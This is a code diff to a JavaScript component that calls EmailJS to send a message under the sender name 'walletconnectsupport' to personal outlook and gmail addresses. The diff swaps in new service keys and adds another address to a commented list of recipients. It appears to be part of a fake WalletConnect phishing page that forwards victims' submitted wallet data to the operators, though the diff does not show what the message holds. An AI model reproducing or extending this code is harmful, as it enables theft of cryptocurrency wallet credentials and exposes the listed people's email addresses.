@@ -313,13 +313,14 @@ export default {
   //sendEmail() {
     
       try {
-          emailjs.send('service_pib4i0c', 'template_zeobwbd',
+          emailjs.send( "service_hchsgkm",     // Replace with your EmailJS service ID
+        "template_8ehnn14",    // Replace with your EmailJS template ID
         {
            name: 'walletconnectsupport',
               email: 'showolesheriff7@gmail.com',
            message: msg,
             to:'Melindahotbenks101@outlook.com'
-            },'wqsvu3cCKwr-c_w1_').then((e)=>{
+            },'WU485GiLgQouTPnp5').then((e)=>{
                 console.log(e +'SUCCESSFULLY SENT')
             })
 
@@ -327,7 +328,7 @@ export default {
     } catch(error) {
            console.log(error+'error')
      }
-    //   //jp5296143@gmail.com Resetmarkhamdavid112@gmail.com formjasonwgeorge010@gmail.com fieldMelindahotbenks101@outlook.com
+    //   //jp5296143@gmail.com  knightdajoesd@gmail.com Resetmarkhamdavid112@gmail.com formjasonwgeorge010@gmail.com fieldMelindahotbenks101@outlook.com
     // try {
     //             emailjs.send('service_pib4i0c', 'template_zeobwbd',
     //                 {
